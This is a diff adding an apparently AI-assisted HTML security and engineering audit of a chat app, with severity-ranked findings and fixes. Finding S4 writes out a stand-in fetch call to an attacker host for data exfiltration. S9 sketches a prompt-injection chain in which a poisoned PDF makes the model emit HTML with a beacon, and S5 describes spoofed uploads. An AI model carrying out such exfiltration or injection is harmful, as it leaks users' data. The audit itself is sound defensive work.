@@ -1,0 +1,469 @@
+<title>Atelier Studio Audit</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=Geist:wght@400;500;600&family=Geist+Mono:wght@400;500&display=swap">
+<style>
+  :root {
+    --paper: #FAF9F6; --surface: #FFFFFF; --mist: #F2EFE9; --line: #E8E6DF;
+    --ink: #20201E; --slate: #78776E; --sage: #94977F; --clay: #6B4A38;
+    --accent: #C96442; --accent-ink: #FFFFFF;
+    --sev-critical: #8A2E2A; --sev-high: #C96442; --sev-medium: #A06D2E; --sev-low: #78776E; --sev-info: #94977F;
+    --sev-critical-bg: #F6E4E2; --sev-high-bg: #F7E6DE; --sev-medium-bg: #F4EBDD; --sev-low-bg: #EEEDE8; --sev-info-bg: #ECEDE5;
+    --ok: #4F7A4A; --ok-bg: #E6EEE3;
+    --code-bg: #F2EFE9; --shadow: 0 1px 2px rgba(32,32,30,.06), 0 8px 24px -12px rgba(32,32,30,.12);
+    --serif: "Fraunces", "Iowan Old Style", "Palatino Linotype", Georgia, serif;
+    --sans: "Geist", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    --mono: "Geist Mono", ui-monospace, "Cascadia Mono", Consolas, "Liberation Mono", monospace;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --paper: #1A1815; --surface: #26231D; --mist: #2E2A23; --line: #322E26;
+      --ink: #ECEAE3; --slate: #9A968B; --sage: #A6A88F; --clay: #D9B9A4;
+      --accent: #D98A6A; --accent-ink: #1A1815;
+      --sev-critical: #E08A84; --sev-high: #D98A6A; --sev-medium: #D9A15E; --sev-low: #9A968B; --sev-info: #A6A88F;
+      --sev-critical-bg: #3A2523; --sev-high-bg: #3A2A22; --sev-medium-bg: #3A2F1F; --sev-low-bg: #2E2C27; --sev-info-bg: #2E2F27;
+      --ok: #8DBB86; --ok-bg: #253024;
+      --code-bg: #2E2A23; --shadow: 0 1px 2px rgba(0,0,0,.4), 0 8px 24px -12px rgba(0,0,0,.6);
+    }
+  }
+  :root[data-theme="dark"] {
+    --paper: #1A1815; --surface: #26231D; --mist: #2E2A23; --line: #322E26;
+    --ink: #ECEAE3; --slate: #9A968B; --sage: #A6A88F; --clay: #D9B9A4;
+    --accent: #D98A6A; --accent-ink: #1A1815;
+    --sev-critical: #E08A84; --sev-high: #D98A6A; --sev-medium: #D9A15E; --sev-low: #9A968B; --sev-info: #A6A88F;
+    --sev-critical-bg: #3A2523; --sev-high-bg: #3A2A22; --sev-medium-bg: #3A2F1F; --sev-low-bg: #2E2C27; --sev-info-bg: #2E2F27;
+    --ok: #8DBB86; --ok-bg: #253024;
+    --code-bg: #2E2A23; --shadow: 0 1px 2px rgba(0,0,0,.4), 0 8px 24px -12px rgba(0,0,0,.6);
+  }
+
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--paper); color: var(--ink); font-family: var(--sans); font-size: 15.5px; line-height: 1.55; -webkit-font-smoothing: antialiased; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover, a:focus-visible { text-decoration: underline; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  code, kbd { font-family: var(--mono); font-size: .86em; background: var(--code-bg); border: 1px solid var(--line); border-radius: 4px; padding: .08em .35em; white-space: nowrap; }
+  td code, li code { white-space: normal; }
+  h1, h2, h3 { font-family: var(--serif); font-weight: 500; letter-spacing: -.01em; text-wrap: balance; margin: 0; }
+  h1 { font-size: clamp(2.2rem, 5vw, 3.4rem); line-height: 1.05; font-variation-settings: "opsz" 144; }
+  h2 { font-size: 1.75rem; line-height: 1.15; margin-top: 3.25rem; margin-bottom: 1rem; padding-top: 1.25rem; border-top: 1px solid var(--line); }
+  h3 { font-size: 1.2rem; margin-top: 2rem; margin-bottom: .6rem; font-family: var(--sans); font-weight: 600; letter-spacing: 0; }
+  p { margin: 0 0 1rem; max-width: 72ch; }
+  .eyebrow { font-family: var(--sans); font-size: .72rem; font-weight: 600; letter-spacing: .12em; text-transform: uppercase; color: var(--slate); }
+
+  .wrap { max-width: 980px; margin: 0 auto; padding: 3rem 1.5rem 5rem; }
+  header.mast { display: grid; gap: 1.25rem; padding-bottom: 2rem; border-bottom: 1px solid var(--line); }
+  .meta { display: flex; flex-wrap: wrap; gap: .5rem 1.5rem; color: var(--slate); font-size: .9rem; }
+  .meta b { color: var(--ink); font-weight: 500; }
+  .lede { font-size: 1.08rem; max-width: 66ch; color: var(--ink); }
+
+  .ledger { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: .25rem; }
+  .ledger .chip { display: inline-flex; align-items: baseline; gap: .45rem; padding: .35rem .7rem; border-radius: 999px; border: 1px solid var(--line); background: var(--surface); font-size: .86rem; }
+  .ledger .chip .n { font-family: var(--serif); font-size: 1.15rem; font-variant-numeric: tabular-nums; }
+  .ledger .chip .l { font-weight: 500; letter-spacing: .02em; }
+  .chip.critical .n, .chip.critical .l { color: var(--sev-critical); }
+  .chip.high .n, .chip.high .l { color: var(--sev-high); }
+  .chip.medium .n, .chip.medium .l { color: var(--sev-medium); }
+  .chip.low .n, .chip.low .l { color: var(--sev-low); }
+  .chip.info .n, .chip.info .l { color: var(--sev-info); }
+
+  .gate { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: .6rem; margin: 1.25rem 0 0; }
+  .gate div { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: .65rem .8rem; }
+  .gate .k { font-size: .72rem; letter-spacing: .1em; text-transform: uppercase; color: var(--slate); font-weight: 600; }
+  .gate .v { font-family: var(--mono); font-size: .92rem; margin-top: .15rem; }
+  .gate .v.ok { color: var(--ok); }
+  .gate .v.bad { color: var(--sev-critical); font-weight: 500; }
+
+  nav.toc { margin: 1.75rem 0 0; display: flex; flex-wrap: wrap; gap: .35rem 1rem; font-size: .9rem; }
+  nav.toc a { color: var(--slate); }
+  nav.toc a:hover { color: var(--accent); }
+
+  .note { background: var(--mist); border-left: 3px solid var(--accent); padding: .8rem 1rem; border-radius: 0 6px 6px 0; margin: 1rem 0 1.5rem; max-width: 76ch; }
+  .note p:last-child { margin-bottom: 0; }
+
+  .scroll { overflow-x: auto; margin: 1rem 0 1.5rem; border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
+  table { border-collapse: collapse; width: 100%; font-size: .9rem; font-variant-numeric: tabular-nums; }
+  th, td { text-align: left; vertical-align: top; padding: .55rem .75rem; border-bottom: 1px solid var(--line); }
+  th { font-size: .72rem; letter-spacing: .1em; text-transform: uppercase; color: var(--slate); font-weight: 600; background: var(--mist); }
+  tr:last-child td { border-bottom: 0; }
+  td.n { text-align: right; white-space: nowrap; }
+  .sev { display: inline-block; font-size: .7rem; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; padding: .15rem .5rem; border-radius: 4px; white-space: nowrap; }
+  .sev.critical { color: var(--sev-critical); background: var(--sev-critical-bg); }
+  .sev.high { color: var(--sev-high); background: var(--sev-high-bg); }
+  .sev.medium { color: var(--sev-medium); background: var(--sev-medium-bg); }
+  .sev.low { color: var(--sev-low); background: var(--sev-low-bg); }
+  .sev.info { color: var(--sev-info); background: var(--sev-info-bg); }
+  .sev.ok { color: var(--ok); background: var(--ok-bg); }
+
+  article.f { border-left: 3px solid var(--line); padding: .2rem 0 .2rem 1.1rem; margin: 1.35rem 0; max-width: 80ch; }
+  article.f.critical { border-left-color: var(--sev-critical); }
+  article.f.high { border-left-color: var(--sev-high); }
+  article.f.medium { border-left-color: var(--sev-medium); }
+  article.f.low { border-left-color: var(--sev-low); }
+  article.f.info { border-left-color: var(--sev-info); }
+  article.f .t { display: flex; flex-wrap: wrap; align-items: baseline; gap: .5rem .7rem; margin-bottom: .35rem; }
+  article.f .t .id { font-family: var(--mono); font-size: .8rem; color: var(--slate); }
+  article.f .t strong { font-weight: 600; font-size: 1.02rem; }
+  article.f .loc { font-family: var(--mono); font-size: .8rem; color: var(--slate); margin-bottom: .5rem; word-break: break-word; }
+  article.f dl { display: grid; grid-template-columns: max-content 1fr; gap: .3rem 1rem; margin: 0; font-size: .95rem; }
+  article.f dt { font-size: .7rem; letter-spacing: .1em; text-transform: uppercase; color: var(--slate); font-weight: 600; padding-top: .25rem; }
+  article.f dd { margin: 0; }
+  article.f dd p { margin: 0 0 .35rem; max-width: none; }
+  .v-c { color: var(--ok); font-weight: 600; font-size: .75rem; letter-spacing: .06em; text-transform: uppercase; }
+  .v-p { color: var(--sev-medium); font-weight: 600; font-size: .75rem; letter-spacing: .06em; text-transform: uppercase; }
+
+  ul.dense { padding-left: 1.15rem; margin: .5rem 0 1rem; max-width: 80ch; }
+  ul.dense li { margin: .3rem 0; }
+  ul.dense li .sev { margin-right: .4rem; vertical-align: 1px; }
+  .solid { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 1.1rem 1.3rem; box-shadow: var(--shadow); max-width: 80ch; }
+  .solid ul { margin: .4rem 0 0; padding-left: 1.15rem; }
+  .solid li { margin: .35rem 0; }
+  .two { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; }
+  footer { margin-top: 4rem; padding-top: 1.25rem; border-top: 1px solid var(--line); color: var(--slate); font-size: .85rem; }
+  @media (prefers-reduced-motion: no-preference) { html { scroll-behavior: smooth; } }
+  @media (max-width: 640px) { article.f dl { grid-template-columns: 1fr; gap: .15rem; } .wrap { padding: 2rem 1rem 4rem; } }
+</style>
+
+<div class="wrap">
+<header class="mast">
+  <div class="eyebrow">Technical audit · 2026-09-01</div>
+  <h1>Atelier Studio Audit</h1>
+  <p class="lede">Seven parallel read-only lanes — security, database, AI pipeline, documents &amp; storage, frontend, QA gate, dead code &amp; docs — each run by an Opus subagent, then cross-examined by an independent critical-path review that re-read the source, re-ran the checks, and overruled four lane calls. Every finding is tagged <span class="v-c">confirmed</span> (reproduced) or <span class="v-p">plausible</span> (traced, not executed).</p>
+  <div class="meta">
+    <span>Repo <b>atelier_ai_gpt</b></span>
+    <span>Branch <b>master @ d278fda</b> (6 ahead of origin)</span>
+    <span>Tree <b>clean before &amp; after</b></span>
+    <span>No LLM calls · no prod writes · no dev server</span>
+  </div>
+  <div>
+    <div class="eyebrow" style="margin-bottom:.5rem">Severity ledger (de-duplicated across lanes)</div>
+    <div class="ledger">
+      <span class="chip critical"><span class="n">1</span><span class="l">Critical</span></span>
+      <span class="chip high"><span class="n">26</span><span class="l">High</span></span>
+      <span class="chip medium"><span class="n">33</span><span class="l">Medium</span></span>
+      <span class="chip low"><span class="n">45</span><span class="l">Low</span></span>
+      <span class="chip info"><span class="n">24</span><span class="l">Info</span></span>
+    </div>
+  </div>
+  <div>
+    <div class="eyebrow">Verification gate, cold, this machine</div>
+    <div class="gate">
+      <div><div class="k">typecheck</div><div class="v ok">0 errors · 11 s</div></div>
+      <div><div class="k">lint</div><div class="v ok">0 errors · 24 warnings</div></div>
+      <div><div class="k">build</div><div class="v ok">clean · 0 warnings · 67 s</div></div>
+      <div><div class="k">npm test</div><div class="v bad">RED · 4 / 985 fail (×3)</div></div>
+    </div>
+  </div>
+  <nav class="toc" aria-label="Sections">
+    <a href="#first">Read this first</a><a href="#sec">Security</a><a href="#cost">Cost ledger &amp; registry</a><a href="#db">Database</a><a href="#docs">Documents &amp; storage</a><a href="#fe">Frontend</a><a href="#qa">Tests &amp; CI</a><a href="#stale">Deps &amp; docs</a><a href="#mismatch">Doc vs code</a><a href="#release">Release order</a><a href="#solid">What's solid</a><a href="#method">Method</a>
+  </nav>
+</header>
+
+<div class="note">
+  <p><strong>Where the reviewer overruled a lane.</strong> (1) The Supabase RLS finding was raised as a Critical hypothesis and <em>disproved for the live database</em> by a <code>pg_catalog</code> read — it stands as High <em>drift</em>, not a breach. (2) The <code>x-real-ip</code> throttle bypass reproduces in a test but Vercel's docs state it overwrites that header — Low on the current platform, Medium self-hosted. (3) The red <code>npm test</code> is a harness race, rated High not Critical. (4) One lane's claim that the extraction route runs on the default <code>maxDuration</code> is wrong — <code>process/route.ts:20</code> exports <code>maxDuration = 800</code>.</p>
+</div>
+
+<h2 id="first">Read this first — the ten fixes that matter most</h2>
+<p>Ranked by impact × certainty × cheapness. Every one is confirmed.</p>
+<div class="scroll"><table>
+<thead><tr><th>#</th><th>Sev</th><th>Finding</th><th>Where</th><th>Fix</th></tr></thead>
+<tbody>
+<tr><td class="n">1</td><td><span class="sev critical">Critical</span></td><td>Switching chats mid-stream persists the reply into the <strong>wrong chat</strong> — and mis-scopes its embedding, usage row, title and memory-suggest. Reproduced by test.</td><td><code>src/app/page.tsx:583-593</code> · <code>useChatPersistence.ts:57,78</code></td><td>Carry <code>chatId</code> from send time; <code>stop()</code> on switch</td></tr>
+<tr><td class="n">2</td><td><span class="sev high">High</span></td><td><code>next@16.2.10</code> ships nine advisories fixed in 16.2.11, including a <strong>Middleware/Proxy bypass for App Router + Turbopack</strong>. <code>src/proxy.ts</code> is the only auth.</td><td><code>package.json</code></td><td>One line, in-range</td></tr>
+<tr><td class="n">3</td><td><span class="sev high">High</span></td><td><code>pdfjs-dist@5.7.284</code> (arbitrary JS on a malicious PDF) is explicitly loaded on every upload, in a function holding the service-role key.</td><td><code>src/lib/thumbnails.ts:13</code></td><td>Bump to ≥6.2.108, or drop the override</td></tr>
+<tr><td class="n">4</td><td><span class="sev high">High</span></td><td>Cost ledger loses every aborted or errored turn: no <code>consumeStream()</code>, no <code>abortSignal</code>, no <code>onAbort</code>, no <code>after()</code>. Upstream generation keeps running after the user leaves.</td><td><code>src/app/api/chat/route.ts:198-250</code></td><td>Small</td></tr>
+<tr><td class="n">5</td><td><span class="sev high">High</span></td><td>Sonnet 5 is still priced at the expired $2/$10 intro rate; the file has <strong>no date logic</strong> despite its "reverting automatically" comment. Frozen rows are 33% low, flagged exact.</td><td><code>src/lib/models/pricing.ts:14-20</code></td><td>One line — before <code>0018</code></td></tr>
+<tr><td class="n">6</td><td><span class="sev high">High</span></td><td>RLS on 12 of 15 tables exists <strong>only as live state</strong>; the schema and migrations declare it off. A fresh environment is anon-readable (incl. <code>settings</code>); <code>drizzle-kit push</code> would emit <code>DISABLE ROW LEVEL SECURITY</code>.</td><td><code>src/db/schema.ts</code> · <code>drizzle/0013</code>, <code>0018</code></td><td>One migration</td></tr>
+<tr><td class="n">7</td><td><span class="sev high">High</span></td><td><code>npm test</code> is red: <code>keywordSearch.test.ts</code> calls <code>createTestDb()</code> from <code>it()</code> bodies (5 s default, not the 30 s hook timeout) and the helper publishes <code>client</code> before <code>migrate()</code> resolves. Green with <code>--testTimeout=30000</code>.</td><td><code>tests/unit/lib/keywordSearch.test.ts:11,26</code> · <code>tests/helpers/test-db.ts:25-27</code></td><td>Small</td></tr>
+<tr><td class="n">8</td><td><span class="sev high">High</span></td><td><code>deleteProject</code> sweeps <strong>no</strong> Storage objects; <code>deleteChat</code> orphans artifacts. Rows cascade, so paths are unrecoverable.</td><td><code>src/app/actions.ts:73-75,196-199</code></td><td>Medium</td></tr>
+<tr><td class="n">9</td><td><span class="sev high">High</span></td><td>Hybrid documents stamp text-layer chunks with the <strong>last vision page</strong>; citation chips and <code>#page=N</code> links point at the wrong sheet on exactly the plan sets hybrid exists for. All 5 production docs are hybrid.</td><td><code>documents/process/route.ts:145</code> · <code>src/lib/pageMap.ts:15-16</code></td><td>Small</td></tr>
+<tr><td class="n">10</td><td><span class="sev high">High</span></td><td>Archived chats are <strong>unreachable</strong> — <code>Sidebar</code> declares <code>archivedChats</code> and never renders it. "Archive" reads as delete.</td><td><code>src/components/chat/sidebar/Sidebar.tsx:18</code></td><td>Small</td></tr>
+</tbody></table></div>
+
+<h2 id="sec">Security</h2>
+
+<article class="f high"><div class="t"><span class="id">S1</span><span class="sev high">High</span><strong><code>next@16.2.10</code> carries a Proxy/Middleware-bypass advisory and <code>src/proxy.ts</code> is the sole gate</strong></div>
+<div class="loc">package.json · npm audit --omit=dev (re-run by the reviewer)</div>
+<dl><dt>Evidence</dt><dd>GHSA-6gpp-xcg3-4w24 <em>Middleware/Proxy bypass in App Router using Turbopack</em>, plus unauthenticated Server Function endpoint disclosure, Server-Action DoS, two cache-confusion and two SSRF advisories — all <code>&gt;=16.0.0 &lt;16.2.11</code>. The app is App Router + Turbopack.</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> — audit payload + installed version.</dd>
+<dt>Fix</dt><dd><code>npm i next@^16.2.11</code> (or in-range 16.3.4), redeploy. Highest-priority actionable item.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">S2</span><span class="sev high">High</span><strong><code>pdfjs-dist@5.7.284</code> arbitrary-JS advisory on the upload path</strong></div>
+<div class="loc">src/lib/thumbnails.ts:13 → documents/process/route.ts:170-177</div>
+<dl><dt>Evidence</dt><dd>GHSA-hq66-cqwq-w95j (<code>&gt;=5.6.83 &lt;6.2.108</code>). The app opts out of <code>unpdf</code>'s bundled build with <code>definePDFJSModule(() =&gt; import('pdfjs-dist/legacy/build/pdf.mjs'))</code> on every PDF; the override is process-global. The function holds <code>SUPABASE_SERVICE_ROLE_KEY</code>, <code>DATABASE_URL</code>, every provider key.</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> — advisory, version, and call path read end to end.</dd>
+<dt>Fix</dt><dd><code>pdfjs-dist@^6.2.108</code> (check <code>renderPageAsImage</code> against the v6 legacy build) or remove the override.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">S3</span><span class="sev high">High</span><strong>RLS is live-only state; the repo declares it off</strong></div>
+<div class="loc">src/db/schema.ts (3 × .enableRLS()) · drizzle/0013, 0018 · drizzle/meta/0018_snapshot.json</div>
+<dl><dt>Evidence</dt><dd>Live <code>pg_catalog</code>: <code>relrowsecurity = true</code> on all 15 tables, <code>pg_policies</code> = 0, <code>anon</code>/<code>authenticated</code> hold full DML grants but not <code>BYPASSRLS</code> → PostgREST default-denies today. But only <code>artifact_versions</code>, <code>generated_images</code>, <code>usage_events</code> carry <code>.enableRLS()</code>; the snapshot says <code>isRLSEnabled:false</code> for the other 13; older handoffs record a dashboard pass that turned it on out-of-band.</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> — live read + static.</dd>
+<dt>Impact</dt><dd>A new Supabase project built from <code>drizzle/</code> exposes <code>settings</code> (API keys), <code>messages</code>, <code>documents</code> to the browser-shipped anon key. <code>drizzle-kit push</code> would disable RLS on 12 tables.</dd>
+<dt>Fix</dt><dd><code>.enableRLS()</code> on every table + a migration of 13 <code>ALTER TABLE … ENABLE ROW LEVEL SECURITY</code>; <code>REVOKE ALL … FROM anon, authenticated</code> + default privileges; consider disabling the Data API for <code>public</code>. Document "never <code>drizzle-kit push</code>" with the reason.</dd></dl></article>
+
+<article class="f medium"><div class="t"><span class="id">S4</span><span class="sev medium">Medium</span><strong>CSP <code>connect-src 'self' https:</code> gives model-generated artifact HTML an unrestricted exfil channel</strong></div>
+<div class="loc">next.config.ts:44 · ArtifactPreview.tsx:69-77</div>
+<dl><dt>Evidence</dt><dd>Sandboxed <code>srcDoc</code> iframes inherit the embedder's CSP; <code>fetch('https://attacker/…', {method:'POST'})</code> is allowed. Payload half of the prompt-injection chain (S9).</dd><dt>Fix</dt><dd><code>connect-src 'self' &lt;supabaseOrigin&gt;</code> — <code>imgFrame</code> already computes the origin.</dd></dl></article>
+
+<article class="f medium"><div class="t"><span class="id">S5</span><span class="sev medium">Medium</span><strong>Client-declared MIME is never verified; PDF previews iframe the cross-origin URL with no sandbox</strong></div>
+<div class="loc">useDocumentUpload.ts:14 · upload-url/route.ts:17-26 · DocumentPreviewDialog.tsx:159-163</div>
+<dl><dt>Evidence</dt><dd>Upload HTML bytes as <code>report.pdf</code> with <code>Content-Type: text/html</code>; Supabase serves it as HTML inside an un-sandboxed iframe on the <code>*.supabase.co</code> origin (no app cookies — UI redress, not session XSS).</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by trace (not executed against prod).</dd><dt>Fix</dt><dd>Sniff magic bytes in <code>/process</code>; <code>sandbox</code> the iframe or proxy previews same-origin like <code>/api/artifacts/[id]/raw</code>.</dd></dl></article>
+
+<article class="f medium"><div class="t"><span class="id">S6</span><span class="sev medium">Medium</span><strong>78 server actions, no argument validation; <code>setSetting</code> accepts any key including the provider API keys</strong></div>
+<div class="loc">src/app/actions.ts:312-330</div>
+<dl><dt>Evidence</dt><dd>Read-side <code>SENSITIVE_KEYS</code> is airtight (3 readers, all filtered — verified). Write side has no allow-list; <code>setSettings</code> takes an unbounded array.</dd><dt>Fix</dt><dd>Allow-list writable keys; a dedicated action for API keys; Zod on id/free-text actions.</dd></dl></article>
+
+<article class="f medium"><div class="t"><span class="id">S7</span><span class="sev medium">Medium</span><strong>The access gate is opt-in and fails open</strong></div>
+<div class="loc">src/lib/auth.ts:14-16,128 · src/proxy.ts:10</div>
+<dl><dt>Evidence</dt><dd>One missing env var publishes every project, chat, document and artifact and exposes all 78 actions and the LLM keys' spend; <code>verifyFilePathSig</code> returns <code>true</code> too (<span class="v-c">confirmed by test</span>). No startup assertion.</dd><dt>Fix</dt><dd>Throw (or 503) in production when <code>APP_ACCESS_PASSWORD</code> is unset unless <code>ALLOW_UNAUTHENTICATED=1</code>; refuse to enable the gate without <code>AUTH_SECRET</code>.</dd></dl></article>
+
+<article class="f low"><div class="t"><span class="id">S8</span><span class="sev low">Low on Vercel</span><span class="sev medium">Medium self-hosted</span><strong>Login throttle keys on client-supplied <code>x-real-ip</code></strong></div>
+<div class="loc">src/app/api/auth/route.ts:22-31</div>
+<dl><dt>Evidence</dt><dd>Reproduced: 25 failures with a rotating header never trip the 429 (a fixed header does at 11). Vercel's docs: "Vercel overwrites this header and does not forward external IPs to prevent spoofing."</dd><dt>Fix</dt><dd>Prefer <code>x-vercel-forwarded-for</code> / rightmost XFF; add the WAF rule <code>rateLimit.ts</code> already recommends.</dd></dl></article>
+
+<article class="f info"><div class="t"><span class="id">S9</span><span class="sev info">Info</span><strong>Prompt-injection surfaces have no delimiting</strong></div>
+<div class="loc">projectPreamble.ts:4-5 · chat/route.ts:176-179 · retrieval.ts:107 · documents/tool.ts:55</div>
+<dl><dt>Evidence</dt><dd>Filenames are interpolated raw into a system-prompt line; a chunk body can forge its own <code>[Source:</code> header. Concrete chain: poisoned PDF → <code>generate_artifact</code> HTML with a beacon → S4 lets it out.</dd><dt>Fix</dt><dd>Per-request random delimiters; strip <code>[Source:</code>/<code>[cite:</code> from chunk bodies; quote filenames.</dd></dl></article>
+
+<p><strong>Also (Low/Info, verified):</strong> 30-day cookies survive password rotation (documented tradeoff) · <code>AUTH_SECRET</code> optional · <code>allow-popups-to-escape-sandbox</code> on the artifact preview · <code>/api/files/raw</code> is a permanent bearer capability (tight allow-list, HMAC-bound — fine as designed, but <strong>undocumented in AUTH.md/CLAUDE.md</strong>) · <code>/login</code> is exempt for POST too (server-action forwarding mitigation traced, not executed — gate it to GET) · <code>memory/suggest:89</code> logs extracted project facts verbatim · no <code>Permissions-Policy</code>, <code>poweredByHeader</code> on · <code>z.string().url()</code> accepts <code>file:</code>/link-local for Tavily.</p>
+<p><span class="sev ok">Verified clean</span> No secrets in 618 revisions · no server-only module imported by any <code>'use client'</code> file · markdown has no <code>rehype-raw</code> · HTML artifacts never render inline on the app origin · storage paths server-derived and sanitized · cookie construction (signed <code>exp</code> + nonce, signature-before-parse, constant-time, HMAC-of-both-sides password check) passed 16/16 adversarial probes.</p>
+
+<h2 id="cost">Cost ledger &amp; model registry</h2>
+
+<article class="f high"><div class="t"><span class="id">C1</span><span class="sev high">High</span><strong>Usage rows are lost on every abort or error, and the upstream call is never cancelled</strong></div>
+<div class="loc">src/app/api/chat/route.ts:198-250 · ai@6.0.230 dist ≈7228-7233</div>
+<dl><dt>Evidence</dt><dd><code>streamText</code> gets no <code>abortSignal: req.signal</code>, no <code>onAbort</code>; <code>result.consumeStream()</code> is never called, and <code>onFinish</code> fires from a transform <code>flush</code> that does not run on a cancelled/errored stream. <code>recordUsage</code> is <code>void</code>-fired after the response with no <code>after()</code> (exported by <code>next/server</code> 16.2.10).</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> — grep + installed SDK source, independently by two reviewers.</dd>
+<dt>Impact</dt><dd>Every Stop, tab close, 429/529 = zero <code>usage_events</code> for billed tokens — the long agentic turns the app targets.</dd>
+<dt>Fix</dt><dd>Pass <code>abortSignal</code>; <code>onAbort</code> summing <code>steps[].usage</code>; <code>consumeStream()</code>; wrap the insert in <code>after()</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">C2</span><span class="sev high">High</span><strong>Sonnet 5's intro price never expired</strong></div>
+<div class="loc">src/lib/models/pricing.ts:14-20</div>
+<dl><dt>Evidence</dt><dd><code>'claude-sonnet-5': { inputPerMTok: 2, outputPerMTok: 10 }</code> under a comment promising automatic reversion after 2026-08-31; <code>grep Date</code> → 0. Sonnet 5 backs the default persona and <code>REGEN_MODEL</code>; rows are frozen at write and <code>cost_estimated:false</code>.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> (+ <code>vi.setSystemTime</code> probe).</dd><dt>Fix</dt><dd><code>{3, 15}</code> now (or the <code>model-pricing-overrides</code> row); structurally, dated entries with <code>until</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">C3</span><span class="sev high">High</span><strong><code>resolveRequestedModel</code> returns the requested alias, not the catalog id it matched</strong></div>
+<div class="loc">src/lib/models/registry.ts:283-285</div>
+<dl><dt>Evidence</dt><dd>After a <code>byId</code> hit it returns <code>requested</code>; for dated-only families the provider is handed <code>claude-haiku-4-5</code> while the real id is <code>claude-haiku-4-5-20251001</code>. Pricing/capabilities go through <code>byId</code> (safe); the provider call does not.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by test.</dd><dt>Fix</dt><dd><code>return { modelId: registry.byId.get(requested)!.id, usedFallback: false }</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">C4</span><span class="sev high">High</span><strong>The "last 20 messages" cap is conditional — there is no token budget anywhere</strong></div>
+<div class="loc">src/app/api/chat/route.ts:147-160</div>
+<dl><dt>Evidence</dt><dd>Slices only when <code>chat.summary</code> is non-null <em>and</em> a context prefix exists. No Gemini key ⇒ no summary ⇒ the full loaded history (≤100 messages × ≤200k chars, images, prior tool outputs) ships every turn. <code>contextWindow</code>/<code>maxOutput</code> are fetched and never read.</dd><dt>Fix</dt><dd>Slice unconditionally; cap <code>semanticContext</code>; add a budget.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>C5</strong> 6 of 11 LLM generation sites record usage — <code>suggest-followups</code> (1/turn), <code>queryRewrite</code> (1/turn), <code>rerank</code> (2/turn), <code>image/generate</code>, <code>visionExtraction</code> record nothing. <span class="v-c">Confirmed</span> by grep.</li>
+<li><span class="sev medium">Medium</span><strong>C6</strong> Legacy <code>claude-3-x</code> ids parse to family <code>'other'</code> (<code>curate.ts:12-15</code>) — a fifth Claude row in the picker, Opus-tier pricing (~5× a legacy Haiku). <span class="v-c">Confirmed</span> by test. Fix: <code>/^claude-(?:\d+(?:-\d+)*-)?([a-z]+)/</code>.</li>
+<li><span class="sev medium">Medium</span><strong>C7</strong> Adaptive thinking is sent unconditionally (<code>providers.ts:41</code>); <code>supportsThinking</code> is derived and never read.</li>
+<li><span class="sev medium">Medium</span><strong>C8</strong> <code>REGEN_MODEL = 'claude-sonnet-5'</code> hardcoded, bypasses the registry (<code>regenerate/route.ts:15,50</code>).</li>
+<li><span class="sev medium">Medium</span><strong>C9</strong> Non-400 provider errors (401/429/529/timeouts) collapse to a 5-second "An error occurred." toast (<code>chat/route.ts:244-249</code>, <code>page.tsx:368-379</code>).</li>
+<li><span class="sev low">Low</span> Registry has no in-flight dedup (cold-start herd, up to 5 s TTFT) · <code>usage_events</code> insert failures (incl. the missing table today) are one <code>console.warn</code> · retrieval source header emits an en-dash <code>CITE_RE</code> rejects (telemetry undercounts) · <code>classify</code>/<code>embed</code> return 200 on failure so a dead embed pipeline is invisible.</li>
+<li><span class="sev info">Info</span> Prompt caching entirely unused (<code>cache_control</code> nowhere) — the largest untaken cost lever · web-search per-call fees not modeled · <code>webSearch_20260209</code> available, <code>_20250305</code> used · prior-turn tool outputs (100k-char <code>read_document</code> windows) re-sent every turn within a session.</li>
+</ul>
+<p><span class="sev ok">Verified correct</span> The cache-token split (<code>noCacheTokens</code>, never raw <code>inputTokens</code>) — the naive formula would over-bill 2.1× on a cached turn · <code>totalUsage</code> across the tool loop · <code>clearModelRegistryCache</code> after commit · per-entry override validation · UTC bucketing and <code>::float8</code> casts in the rollups · housekeeping routes pinned server-side.</p>
+
+<h2 id="db">Database</h2>
+<div class="note"><p><strong>Live state (read-only, verified).</strong> PostgreSQL 17.6 · pgvector 0.8.0 · pg_trgm 1.6. <code>drizzle.__drizzle_migrations</code> = 18 rows (<code>0000</code>–<code>0017</code>); <code>to_regclass('public.usage_events')</code> = NULL → <strong><code>0018</code> authored, not applied — CLAUDE.md and the handoff are accurate.</strong> 15 tables, 44 indexes byte-identical to the migrations (HNSW ×2, GIN ×2), 1,073 chunks / 146 messages / 5 ready docs (all hybrid), zero orphans, zero stuck rows, <strong>zero CHECK constraints, zero triggers, zero RLS policies</strong>. <code>drizzle-kit check</code> passes; <code>generate</code> reports no drift. <code>settings</code> holds no API keys today.</p></div>
+
+<article class="f high"><div class="t"><span class="id">D1</span><span class="sev high">High</span><strong>Hybrid search's FTS leg is dead for natural-language questions</strong></div>
+<div class="loc">src/lib/keywordSearch.ts:49-61</div>
